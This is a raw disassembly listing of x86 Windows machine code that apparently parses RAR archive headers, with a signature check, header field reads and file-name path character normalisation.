  401da6:	89 83 f4 21 00 00    	mov    %eax,0x21f4(%ebx)
  401dac:	8b 03                	mov    (%ebx),%eax
  401dae:	6a 00                	push   $0x0
  401db0:	57                   	push   %edi
  401db1:	56                   	push   %esi
  401db2:	8b 70 10             	mov    0x10(%eax),%esi
  401db5:	8b ce                	mov    %esi,%ecx
  401db7:	ff 15 78 32 43 00    	call   *0x433278
  401dbd:	8b cb                	mov    %ebx,%ecx
  401dbf:	ff d6                	call   *%esi
  401dc1:	80 bb cd 6c 00 00 00 	cmpb   $0x0,0x6ccd(%ebx)
  401dc8:	74 09                	je     0x401dd3
  401dca:	80 bb d1 6c 00 00 00 	cmpb   $0x0,0x6cd1(%ebx)
  401dd1:	74 15                	je     0x401de8
  401dd3:	68 00 08 00 00       	push   $0x800
  401dd8:	8d 4b 32             	lea    0x32(%ebx),%ecx
  401ddb:	51                   	push   %ecx
  401ddc:	8d 8b 12 6d 00 00    	lea    0x6d12(%ebx),%ecx
  401de2:	51                   	push   %ecx
  401de3:	e8 1a e8 00 00       	call   0x410602
  401de8:	b0 01                	mov    $0x1,%al
  401dea:	e9 b3 fd ff ff       	jmp    0x401ba2
  401def:	cc                   	int3
  401df0:	83 79 08 ff          	cmpl   $0xffffffff,0x8(%ecx)
  401df4:	0f 95 c0             	setne  %al
  401df7:	c3                   	ret
  401df8:	33 c9                	xor    %ecx,%ecx
  401dfa:	83 7c 24 08 01       	cmpl   $0x1,0x8(%esp)
  401dff:	72 4a                	jb     0x401e4b
  401e01:	8b 44 24 04          	mov    0x4(%esp),%eax
  401e05:	80 38 52             	cmpb   $0x52,(%eax)
  401e08:	75 41                	jne    0x401e4b
  401e0a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%esp)
  401e0f:	72 3a                	jb     0x401e4b
  401e11:	80 78 01 61          	cmpb   $0x61,0x1(%eax)
  401e15:	75 34                	jne    0x401e4b
  401e17:	80 78 02 72          	cmpb   $0x72,0x2(%eax)
  401e1b:	75 2e                	jne    0x401e4b
  401e1d:	80 78 03 21          	cmpb   $0x21,0x3(%eax)
  401e21:	75 28                	jne    0x401e4b
  401e23:	80 78 04 1a          	cmpb   $0x1a,0x4(%eax)
  401e27:	75 22                	jne    0x401e4b
  401e29:	80 78 05 07          	cmpb   $0x7,0x5(%eax)
  401e2d:	75 1c                	jne    0x401e4b
  401e2f:	8a 40 06             	mov    0x6(%eax),%al
  401e32:	84 c0                	test   %al,%al
  401e34:	75 04                	jne    0x401e3a
  401e36:	6a 02                	push   $0x2
  401e38:	eb 10                	jmp    0x401e4a
  401e3a:	3c 01                	cmp    $0x1,%al
  401e3c:	75 04                	jne    0x401e42
  401e3e:	6a 03                	push   $0x3
  401e40:	eb 08                	jmp    0x401e4a
  401e42:	2c 02                	sub    $0x2,%al
  401e44:	3c 02                	cmp    $0x2,%al
  401e46:	77 03                	ja     0x401e4b
  401e48:	6a 04                	push   $0x4
  401e4a:	59                   	pop    %ecx
  401e4b:	8b c1                	mov    %ecx,%eax
  401e4d:	c2 08 00             	ret    $0x8
  401e50:	b8 73 26 43 00       	mov    $0x432673,%eax
  401e55:	e8 1e cd 01 00       	call   0x41eb78
  401e5a:	83 ec 18             	sub    $0x18,%esp
  401e5d:	53                   	push   %ebx
  401e5e:	33 db                	xor    %ebx,%ebx
  401e60:	8b c1                	mov    %ecx,%eax
  401e62:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401e65:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  401e68:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  401e6b:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  401e6e:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  401e71:	88 5d ec             	mov    %bl,-0x14(%ebp)
  401e74:	53                   	push   %ebx
  401e75:	53                   	push   %ebx
  401e76:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401e79:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401e7c:	51                   	push   %ecx
  401e7d:	8b c8                	mov    %eax,%ecx
  401e7f:	e8 36 1d 00 00       	call   0x403bba
  401e84:	84 c0                	test   %al,%al
  401e86:	0f 84 83 00 00 00    	je     0x401f0f
  401e8c:	56                   	push   %esi
  401e8d:	57                   	push   %edi
  401e8e:	8b 7d e0             	mov    -0x20(%ebp),%edi
  401e91:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401e94:	6a 01                	push   $0x1
  401e96:	e8 97 f8 ff ff       	call   0x401732
  401e9b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401e9e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ea1:	8b 75 08             	mov    0x8(%ebp),%esi
  401ea4:	88 5c 01 ff          	mov    %bl,-0x1(%ecx,%eax,1)
  401ea8:	8d 47 01             	lea    0x1(%edi),%eax
  401eab:	50                   	push   %eax
  401eac:	8b ce                	mov    %esi,%ecx
  401eae:	e8 f6 f9 ff ff       	call   0x4018a9
  401eb3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401eb6:	83 b8 c8 6c 00 00 03 	cmpl   $0x3,0x6cc8(%eax)
  401ebd:	75 0f                	jne    0x401ece
  401ebf:	ff 76 04             	push   0x4(%esi)
  401ec2:	ff 36                	push   (%esi)
  401ec4:	ff 75 dc             	push   -0x24(%ebp)
  401ec7:	e8 6f fd 00 00       	call   0x411c3b
  401ecc:	eb 2d                	jmp    0x401efb
  401ece:	f6 80 0c 46 00 00 01 	testb  $0x1,0x460c(%eax)
  401ed5:	74 17                	je     0x401eee
  401ed7:	d1 ef                	shr    $1,%edi
  401ed9:	57                   	push   %edi
  401eda:	ff 36                	push   (%esi)
  401edc:	ff 75 dc             	push   -0x24(%ebp)
  401edf:	e8 19 fd 00 00       	call   0x411bfd
  401ee4:	8b 06                	mov    (%esi),%eax
  401ee6:	33 c9                	xor    %ecx,%ecx
  401ee8:	66 89 0c 78          	mov    %cx,(%eax,%edi,2)
  401eec:	eb 0d                	jmp    0x401efb
  401eee:	ff 76 04             	push   0x4(%esi)
  401ef1:	ff 36                	push   (%esi)
  401ef3:	ff 75 dc             	push   -0x24(%ebp)
  401ef6:	e8 89 fc 00 00       	call   0x411b84
  401efb:	ff 36                	push   (%esi)
  401efd:	e8 11 1f 02 00       	call   0x423e13
  401f02:	59                   	pop    %ecx
  401f03:	50                   	push   %eax
  401f04:	8b ce                	mov    %esi,%ecx
  401f06:	e8 9e f9 ff ff       	call   0x4018a9
  401f0b:	5f                   	pop    %edi
  401f0c:	b3 01                	mov    $0x1,%bl
  401f0e:	5e                   	pop    %esi
  401f0f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f12:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  401f19:	85 c0                	test   %eax,%eax
  401f1b:	74 19                	je     0x401f36
  401f1d:	80 7d ec 00          	cmpb   $0x0,-0x14(%ebp)
  401f21:	74 0c                	je     0x401f2f
  401f23:	ff 75 e4             	push   -0x1c(%ebp)
  401f26:	50                   	push   %eax
  401f27:	e8 19 d5 00 00       	call   0x40f445
  401f2c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f2f:	50                   	push   %eax
  401f30:	e8 f9 1e 02 00       	call   0x423e2e
  401f35:	59                   	pop    %ecx
  401f36:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401f39:	8a c3                	mov    %bl,%al
  401f3b:	5b                   	pop    %ebx
  401f3c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401f43:	c9                   	leave
  401f44:	c2 04 00             	ret    $0x4
  401f47:	56                   	push   %esi
  401f48:	57                   	push   %edi
  401f49:	8b f9                	mov    %ecx,%edi
  401f4b:	6a 00                	push   $0x0
  401f4d:	8b 07                	mov    (%edi),%eax
  401f4f:	ff b7 c4 6c 00 00    	push   0x6cc4(%edi)
  401f55:	ff b7 c0 6c 00 00    	push   0x6cc0(%edi)
  401f5b:	8b 70 10             	mov    0x10(%eax),%esi
  401f5e:	8b ce                	mov    %esi,%ecx
  401f60:	ff 15 78 32 43 00    	call   *0x433278
  401f66:	8b cf                	mov    %edi,%ecx
  401f68:	ff d6                	call   *%esi
  401f6a:	5f                   	pop    %edi
  401f6b:	5e                   	pop    %esi
  401f6c:	c3                   	ret
  401f6d:	b8 8c 26 43 00       	mov    $0x43268c,%eax
  401f72:	e8 01 cc 01 00       	call   0x41eb78
  401f77:	8b 81 d4 21 00 00    	mov    0x21d4(%ecx),%eax
  401f7d:	83 ec 14             	sub    $0x14,%esp
  401f80:	80 b8 5a 71 00 00 00 	cmpb   $0x0,0x715a(%eax)
  401f87:	75 47                	jne    0x401fd0
  401f89:	33 c0                	xor    %eax,%eax
  401f8b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401f8e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401f91:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401f94:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f97:	88 45 f0             	mov    %al,-0x10(%ebp)
  401f9a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f9d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401fa0:	50                   	push   %eax
  401fa1:	e8 09 fa ff ff       	call   0x4019af
  401fa6:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  401faa:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fb1:	74 1d                	je     0x401fd0
  401fb3:	80 7d f0 00          	cmpb   $0x0,-0x10(%ebp)
  401fb7:	74 0e                	je     0x401fc7
  401fb9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401fbc:	03 c0                	add    %eax,%eax
  401fbe:	50                   	push   %eax
  401fbf:	ff 75 e0             	push   -0x20(%ebp)
  401fc2:	e8 7e d4 00 00       	call   0x40f445
  401fc7:	ff 75 e0             	push   -0x20(%ebp)
  401fca:	e8 5f 1e 02 00       	call   0x423e2e
  401fcf:	59                   	pop    %ecx
  401fd0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401fd3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401fda:	c9                   	leave
  401fdb:	c3                   	ret
  401fdc:	57                   	push   %edi
  401fdd:	ff 74 24 08          	push   0x8(%esp)
  401fe1:	8b f9                	mov    %ecx,%edi
  401fe3:	e8 5a 7f 00 00       	call   0x409f42
  401fe8:	84 c0                	test   %al,%al
  401fea:	74 31                	je     0x40201d
  401fec:	6a 00                	push   $0x0
  401fee:	8b cf                	mov    %edi,%ecx
  401ff0:	e8 0f fa ff ff       	call   0x401a04
  401ff5:	84 c0                	test   %al,%al
  401ff7:	75 22                	jne    0x40201b
  401ff9:	56                   	push   %esi
  401ffa:	8d 47 32             	lea    0x32(%edi),%eax
  401ffd:	50                   	push   %eax
  401ffe:	6a 39                	push   $0x39
  402000:	e8 86 f3 ff ff       	call   0x40138b
  402005:	8b 07                	mov    (%edi),%eax
  402007:	8b 70 08             	mov    0x8(%eax),%esi
  40200a:	8b ce                	mov    %esi,%ecx
  40200c:	ff 15 78 32 43 00    	call   *0x433278
  402012:	8b cf                	mov    %edi,%ecx
  402014:	ff d6                	call   *%esi
  402016:	32 c0                	xor    %al,%al
  402018:	5e                   	pop    %esi
  402019:	eb 02                	jmp    0x40201d
  40201b:	b0 01                	mov    $0x1,%al
  40201d:	5f                   	pop    %edi
  40201e:	c2 04 00             	ret    $0x4
  402021:	55                   	push   %ebp
  402022:	8b ec                	mov    %esp,%ebp
  402024:	83 ec 4c             	sub    $0x4c,%esp
  402027:	ff 75 08             	push   0x8(%ebp)
  40202a:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40202d:	e8 94 f5 ff ff       	call   0x4015c6
  402032:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402035:	83 f9 08             	cmp    $0x8,%ecx
  402038:	73 1d                	jae    0x402057
  40203a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40203d:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  402041:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402044:	41                   	inc    %ecx
  402045:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402048:	83 f9 08             	cmp    $0x8,%ecx
  40204b:	73 0a                	jae    0x402057
  40204d:	8b 45 10             	mov    0x10(%ebp),%eax
  402050:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  402054:	ff 45 f4             	incl   -0xc(%ebp)
  402057:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40205a:	e8 9f f5 00 00       	call   0x4115fe
  40205f:	c9                   	leave
  402060:	c2 0c 00             	ret    $0xc
  402063:	55                   	push   %ebp
  402064:	8b ec                	mov    %esp,%ebp
  402066:	83 ec 4c             	sub    $0x4c,%esp
  402069:	ff 75 08             	push   0x8(%ebp)
  40206c:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40206f:	e8 52 f5 ff ff       	call   0x4015c6
  402074:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402077:	83 f9 08             	cmp    $0x8,%ecx
  40207a:	73 30                	jae    0x4020ac
  40207c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40207f:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  402083:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402086:	41                   	inc    %ecx
  402087:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40208a:	83 f9 08             	cmp    $0x8,%ecx
  40208d:	73 1d                	jae    0x4020ac
  40208f:	8b 45 10             	mov    0x10(%ebp),%eax
  402092:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  402096:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402099:	41                   	inc    %ecx
  40209a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40209d:	83 f9 08             	cmp    $0x8,%ecx
  4020a0:	73 0a                	jae    0x4020ac
  4020a2:	8b 45 14             	mov    0x14(%ebp),%eax
  4020a5:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  4020a9:	ff 45 f4             	incl   -0xc(%ebp)
  4020ac:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4020af:	e8 4a f5 00 00       	call   0x4115fe
  4020b4:	c9                   	leave
  4020b5:	c2 10 00             	ret    $0x10
  4020b8:	e9 3e f5 ff ff       	jmp    0x4015fb
  4020bd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4020c1:	3b 41 08             	cmp    0x8(%ecx),%eax
  4020c4:	76 0b                	jbe    0x4020d1
  4020c6:	2b 41 04             	sub    0x4(%ecx),%eax
  4020c9:	50                   	push   %eax
  4020ca:	e8 63 f6 ff ff       	call   0x401732
  4020cf:	eb 03                	jmp    0x4020d4
  4020d1:	89 41 04             	mov    %eax,0x4(%ecx)
  4020d4:	c2 04 00             	ret    $0x4
  4020d7:	56                   	push   %esi
  4020d8:	8b f1                	mov    %ecx,%esi
  4020da:	8d 46 32             	lea    0x32(%esi),%eax
  4020dd:	50                   	push   %eax
  4020de:	6a 1a                	push   $0x1a
  4020e0:	e8 a6 f2 ff ff       	call   0x40138b
  4020e5:	6a 03                	push   $0x3
  4020e7:	b9 98 10 44 00       	mov    $0x441098,%ecx
  4020ec:	c6 86 dc 6c 00 00 01 	movb   $0x1,0x6cdc(%esi)
  4020f3:	e8 8b 4c 00 00       	call   0x406d83
  4020f8:	5e                   	pop    %esi
  4020f9:	c3                   	ret
  4020fa:	ff 74 24 04          	push   0x4(%esp)
  4020fe:	8d 41 28             	lea    0x28(%ecx),%eax
  402101:	50                   	push   %eax
  402102:	e8 42 1d 02 00       	call   0x423e49
  402107:	f7 d8                	neg    %eax
  402109:	59                   	pop    %ecx
  40210a:	1a c0                	sbb    %al,%al
  40210c:	59                   	pop    %ecx
  40210d:	fe c0                	inc    %al
  40210f:	c2 04 00             	ret    $0x4
  402112:	83 b9 94 33 00 00 00 	cmpl   $0x0,0x3394(%ecx)
  402119:	74 18                	je     0x402133
  40211b:	33 c0                	xor    %eax,%eax
  40211d:	38 81 89 33 00 00    	cmp    %al,0x3389(%ecx)
  402123:	0f 94 c0             	sete   %al
  402126:	48                   	dec    %eax
  402127:	83 e0 f0             	and    $0xfffffff0,%eax
  40212a:	83 c0 20             	add    $0x20,%eax
  40212d:	89 81 bc 22 00 00    	mov    %eax,0x22bc(%ecx)
  402133:	c3                   	ret
  402134:	56                   	push   %esi
  402135:	8b 74 24 08          	mov    0x8(%esp),%esi
  402139:	57                   	push   %edi
  40213a:	8b f9                	mov    %ecx,%edi
  40213c:	8b 86 fc 10 00 00    	mov    0x10fc(%esi),%eax
  402142:	83 f8 02             	cmp    $0x2,%eax
  402145:	75 39                	jne    0x402180
  402147:	33 c0                	xor    %eax,%eax
  402149:	38 86 f1 10 00 00    	cmp    %al,0x10f1(%esi)
  40214f:	0f 94 c0             	sete   %al
  402152:	48                   	dec    %eax
  402153:	83 e0 f0             	and    $0xfffffff0,%eax
  402156:	83 c0 20             	add    $0x20,%eax
  402159:	89 46 24             	mov    %eax,0x24(%esi)
  40215c:	83 c6 28             	add    $0x28,%esi
  40215f:	0f b7 06             	movzwl (%esi),%eax
  402162:	66 85 c0             	test   %ax,%ax
  402165:	74 63                	je     0x4021ca
  402167:	53                   	push   %ebx
  402168:	6a 5c                	push   $0x5c
  40216a:	8b c8                	mov    %eax,%ecx
  40216c:	5b                   	pop    %ebx
  40216d:	0f b7 d1             	movzwl %cx,%edx
  402170:	66 3b cb             	cmp    %bx,%cx
  402173:	75 20                	jne    0x402195
  402175:	83 bf c8 6c 00 00 03 	cmpl   $0x3,0x6cc8(%edi)
  40217c:	74 1e                	je     0x40219c
  40217e:	eb 30                	jmp    0x4021b0
  402180:	83 f8 01             	cmp    $0x1,%eax
  402183:	75 d7                	jne    0x40215c
  402185:	83 c6 28             	add    $0x28,%esi
  402188:	68 00 08 00 00       	push   $0x800
  40218d:	56                   	push   %esi
  40218e:	e8 48 97 00 00       	call   0x40b8db
  402193:	eb ca                	jmp    0x40215f
  402195:	8b ca                	mov    %edx,%ecx
  402197:	83 fa 3a             	cmp    $0x3a,%edx
  40219a:	75 08                	jne    0x4021a4
  40219c:	6a 5f                	push   $0x5f
  40219e:	58                   	pop    %eax
  40219f:	66 89 06             	mov    %ax,(%esi)
  4021a2:	eb 18                	jmp    0x4021bc
  4021a4:	8b c1                	mov    %ecx,%eax
  4021a6:	83 f9 2f             	cmp    $0x2f,%ecx
  4021a9:	74 0e                	je     0x4021b9
  4021ab:	66 3b c3             	cmp    %bx,%ax
  4021ae:	75 0c                	jne    0x4021bc
  4021b0:	83 bf c8 6c 00 00 03 	cmpl   $0x3,0x6cc8(%edi)
  4021b7:	74 03                	je     0x4021bc
  4021b9:	66 89 1e             	mov    %bx,(%esi)
  4021bc:	83 c6 02             	add    $0x2,%esi
  4021bf:	0f b7 06             	movzwl (%esi),%eax
  4021c2:	8b c8                	mov    %eax,%ecx
  4021c4:	66 85 c0             	test   %ax,%ax
  4021c7:	75 a4                	jne    0x40216d
  4021c9:	5b                   	pop    %ebx
  4021ca:	5f                   	pop    %edi
  4021cb:	5e                   	pop    %esi
  4021cc:	c2 04 00             	ret    $0x4
  4021cf:	56                   	push   %esi
  4021d0:	8b f1                	mov    %ecx,%esi
  4021d2:	57                   	push   %edi
  4021d3:	8b be d8 6c 00 00    	mov    0x6cd8(%esi),%edi
  4021d9:	03 be 18 22 00 00    	add    0x2218(%esi),%edi
  4021df:	83 be c8 6c 00 00 02 	cmpl   $0x2,0x6cc8(%esi)
  4021e6:	8b 8e 2c 22 00 00    	mov    0x222c(%esi),%ecx
  4021ec:	74 10                	je     0x4021fe
  4021ee:	51                   	push   %ecx
  4021ef:	8b ce                	mov    %esi,%ecx
  4021f1:	e8 8d f7 ff ff       	call   0x401983
  4021f6:	8b 8e 6c 22 00 00    	mov    0x226c(%esi),%ecx
  4021fc:	03 c8                	add    %eax,%ecx
  4021fe:	33 d2                	xor    %edx,%edx
  402200:	03 cf                	add    %edi,%ecx
  402202:	5f                   	pop    %edi
  402203:	13 d2                	adc    %edx,%edx
  402205:	8b c1                	mov    %ecx,%eax
  402207:	5e                   	pop    %esi
  402208:	c3                   	ret
  402209:	8a 81 89 33 00 00    	mov    0x3389(%ecx),%al
  40220f:	c3                   	ret
  402210:	b8 ac 20 00 00       	mov    $0x20ac,%eax
  402215:	e8 36 ca 01 00       	call   0x41ec50
  40221a:	57                   	push   %edi
  40221b:	8b bc 24 b4 20 00 00 	mov    0x20b4(%esp),%edi
  402222:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402226:	8b 47 18             	mov    0x18(%edi),%eax
  402229:	2b 84 24 b8 20 00 00 	sub    0x20b8(%esp),%eax
  402230:	3b 47 1c             	cmp    0x1c(%edi),%eax
  402233:	0f 82 28 06 00 00    	jb     0x402861
  402239:	83 bc 24 b8 20 00 00 	cmpl   $0x2,0x20b8(%esp)
  402240:	02 
  402241:	89 47 1c             	mov    %eax,0x1c(%edi)
  402244:	0f 82 17 06 00 00    	jb     0x402861
  40224a:	53                   	push   %ebx
  40224b:	8b 9c 24 c0 20 00 00 	mov    0x20c0(%esp),%ebx
  402252:	55                   	push   %ebp
  402253:	56                   	push   %esi
  402254:	8b cf                	mov    %edi,%ecx
  402256:	e8 a0 aa 00 00       	call   0x40ccfb
  40225b:	8b c8                	mov    %eax,%ecx
  40225d:	85 d2                	test   %edx,%edx
  40225f:	0f 8c f9 05 00 00    	jl     0x40285e
  402265:	7f 08                	jg     0x40226f
  402267:	85 c9                	test   %ecx,%ecx
  402269:	0f 84 ef 05 00 00    	je     0x40285e
  40226f:	8b 47 18             	mov    0x18(%edi),%eax
  402272:	8b 77 1c             	mov    0x1c(%edi),%esi
  402275:	2b c6                	sub    %esi,%eax
  402277:	0f 84 e1 05 00 00    	je     0x40285e
  40227d:	85 d2                	test   %edx,%edx
  40227f:	0f 8f d9 05 00 00    	jg     0x40285e
  402285:	7c 08                	jl     0x40228f
  402287:	3b c8                	cmp    %eax,%ecx
  402289:	0f 87 cf 05 00 00    	ja     0x40285e
  40228f:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  402292:	8b cf                	mov    %edi,%ecx
  402294:	89 44 24 18          	mov    %eax,0x18(%esp)
  402298:	e8 5e aa 00 00       	call   0x40ccfb
  40229d:	8b ea                	mov    %edx,%ebp
  40229f:	8b f0                	mov    %eax,%esi
  4022a1:	8b 54 24 18          	mov    0x18(%esp),%edx
  4022a5:	8b ca                	mov    %edx,%ecx
  4022a7:	2b 4f 1c             	sub    0x1c(%edi),%ecx
  4022aa:	83 7b 04 01          	cmpl   $0x1,0x4(%ebx)
  4022ae:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4022b2:	75 75                	jne    0x402329
  4022b4:	83 fe 01             	cmp    $0x1,%esi
  4022b7:	75 70                	jne    0x402329
  4022b9:	85 ed                	test   %ebp,%ebp
  4022bb:	75 6c                	jne    0x402329
  4022bd:	8b cf                	mov    %edi,%ecx
  4022bf:	88 43 1e             	mov    %al,0x1e(%ebx)
  4022c2:	e8 34 aa 00 00       	call   0x40ccfb
  4022c7:	89 44 24 20          	mov    %eax,0x20(%esp)
  4022cb:	a8 01                	test   $0x1,%al
  4022cd:	74 29                	je     0x4022f8
  4022cf:	8b cf                	mov    %edi,%ecx
  4022d1:	e8 25 aa 00 00       	call   0x40ccfb
  4022d6:	8b c8                	mov    %eax,%ecx
  4022d8:	0b ca                	or     %edx,%ecx
  4022da:	74 18                	je     0x4022f4
  4022dc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4022e0:	03 81 b8 6c 00 00    	add    0x6cb8(%ecx),%eax
  4022e6:	8b 89 bc 6c 00 00    	mov    0x6cbc(%ecx),%ecx
  4022ec:	13 ca                	adc    %edx,%ecx
  4022ee:	89 43 20             	mov    %eax,0x20(%ebx)
  4022f1:	89 4b 24             	mov    %ecx,0x24(%ebx)
  4022f4:	8b 44 24 20          	mov    0x20(%esp),%eax
  4022f8:	a8 02                	test   $0x2,%al
  4022fa:	74 25                	je     0x402321
  4022fc:	8b cf                	mov    %edi,%ecx
  4022fe:	e8 f8 a9 00 00       	call   0x40ccfb
  402303:	8b c8                	mov    %eax,%ecx
  402305:	0b ca                	or     %edx,%ecx
  402307:	74 18                	je     0x402321
  402309:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40230d:	03 81 b8 6c 00 00    	add    0x6cb8(%ecx),%eax
  402313:	8b 89 bc 6c 00 00    	mov    0x6cbc(%ecx),%ecx
  402319:	13 ca                	adc    %edx,%ecx
  40231b:	89 43 30             	mov    %eax,0x30(%ebx)
  40231e:	89 4b 34             	mov    %ecx,0x34(%ebx)
  402321:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  402325:	8b 54 24 18          	mov    0x18(%esp),%edx
  402329:	83 7b 04 02          	cmpl   $0x2,0x4(%ebx)
  40232d:	74 0a                	je     0x402339
  40232f:	83 7b 04 03          	cmpl   $0x3,0x4(%ebx)
  402333:	0f 85 10 05 00 00    	jne    0x402849
  402339:	85 ed                	test   %ebp,%ebp
  40233b:	0f 87 08 05 00 00    	ja     0x402849
  402341:	72 09                	jb     0x40234c
  402343:	83 fe 07             	cmp    $0x7,%esi
  402346:	0f 87 fd 04 00 00    	ja     0x402849
  40234c:	83 ee 01             	sub    $0x1,%esi
  40234f:	0f 84 9c 03 00 00    	je     0x4026f1
  402355:	83 ee 01             	sub    $0x1,%esi
  402358:	0f 84 6c 03 00 00    	je     0x4026ca
  40235e:	83 ee 01             	sub    $0x1,%esi
  402361:	0f 84 ef 01 00 00    	je     0x402556
  402367:	83 ee 01             	sub    $0x1,%esi
  40236a:	0f 84 93 01 00 00    	je     0x402503
  402370:	83 ee 01             	sub    $0x1,%esi
  402373:	0f 84 0c 01 00 00    	je     0x402485
  402379:	83 ee 01             	sub    $0x1,%esi
  40237c:	74 3b                	je     0x4023b9
  40237e:	83 ee 01             	sub    $0x1,%esi
  402381:	0f 85 c2 04 00 00    	jne    0x402849
  402387:	83 7b 04 03          	cmpl   $0x3,0x4(%ebx)
  40238b:	8b e9                	mov    %ecx,%ebp
  40238d:	75 0d                	jne    0x40239c
  40238f:	8b 47 18             	mov    0x18(%edi),%eax
  402392:	2b c2                	sub    %edx,%eax
  402394:	83 f8 01             	cmp    $0x1,%eax
  402397:	75 03                	jne    0x40239c
  402399:	8d 69 01             	lea    0x1(%ecx),%ebp
  40239c:	8d b3 28 10 00 00    	lea    0x1028(%ebx),%esi
  4023a2:	55                   	push   %ebp
  4023a3:	8b ce                	mov    %esi,%ecx
  4023a5:	e8 13 fd ff ff       	call   0x4020bd
  4023aa:	55                   	push   %ebp
  4023ab:	ff 36                	push   (%esi)
  4023ad:	8b cf                	mov    %edi,%ecx
  4023af:	e8 a9 a8 00 00       	call   0x40cc5d
  4023b4:	e9 90 04 00 00       	jmp    0x402849
  4023b9:	8b cf                	mov    %edi,%ecx
  4023bb:	e8 3b a9 00 00       	call   0x40ccfb
  4023c0:	8b c8                	mov    %eax,%ecx
  4023c2:	89 44 24 20          	mov    %eax,0x20(%esp)
  4023c6:	c1 e9 02             	shr    $0x2,%ecx
  4023c9:	8d ab 08 21 00 00    	lea    0x2108(%ebx),%ebp
  4023cf:	80 e1 01             	and    $0x1,%cl
  4023d2:	88 8b 06 21 00 00    	mov    %cl,0x2106(%ebx)
  4023d8:	8b c8                	mov    %eax,%ecx
  4023da:	c1 e9 03             	shr    $0x3,%ecx
  4023dd:	80 e1 01             	and    $0x1,%cl
  4023e0:	88 8b 07 21 00 00    	mov    %cl,0x2107(%ebx)
  4023e6:	c6 83 08 22 00 00 00 	movb   $0x0,0x2208(%ebx)
  4023ed:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
  4023f1:	a8 01                	test   $0x1,%al
  4023f3:	74 29                	je     0x40241e
  4023f5:	8b cf                	mov    %edi,%ecx
  4023f7:	e8 ff a8 00 00       	call   0x40ccfb
  4023fc:	8b f0                	mov    %eax,%esi
  4023fe:	b8 ff 00 00 00       	mov    $0xff,%eax
  402403:	3b f0                	cmp    %eax,%esi
  402405:	72 02                	jb     0x402409
  402407:	8b f0                	mov    %eax,%esi
  402409:	56                   	push   %esi
  40240a:	55                   	push   %ebp
  40240b:	8b cf                	mov    %edi,%ecx
  40240d:	e8 4b a8 00 00       	call   0x40cc5d
  402412:	8b 44 24 20          	mov    0x20(%esp),%eax
  402416:	c6 84 1e 08 21 00 00 	movb   $0x0,0x2108(%esi,%ebx,1)
  40241d:	00 
  40241e:	a8 02                	test   $0x2,%al
  402420:	74 2b                	je     0x40244d
  402422:	8b cf                	mov    %edi,%ecx
  402424:	e8 d2 a8 00 00       	call   0x40ccfb
  402429:	8b f0                	mov    %eax,%esi
  40242b:	b8 ff 00 00 00       	mov    $0xff,%eax
  402430:	3b f0                	cmp    %eax,%esi
  402432:	72 02                	jb     0x402436
  402434:	8b f0                	mov    %eax,%esi
  402436:	56                   	push   %esi
  402437:	8d 83 08 22 00 00    	lea    0x2208(%ebx),%eax
  40243d:	8b cf                	mov    %edi,%ecx
  40243f:	50                   	push   %eax
  402440:	e8 18 a8 00 00       	call   0x40cc5d
  402445:	c6 84 1e 08 22 00 00 	movb   $0x0,0x2208(%esi,%ebx,1)
  40244c:	00 
  40244d:	80 bb 06 21 00 00 00 	cmpb   $0x0,0x2106(%ebx)
  402454:	74 0d                	je     0x402463
  402456:	8b cf                	mov    %edi,%ecx
  402458:	e8 9e a8 00 00       	call   0x40ccfb
  40245d:	89 83 08 23 00 00    	mov    %eax,0x2308(%ebx)
  402463:	80 bb 07 21 00 00 00 	cmpb   $0x0,0x2107(%ebx)
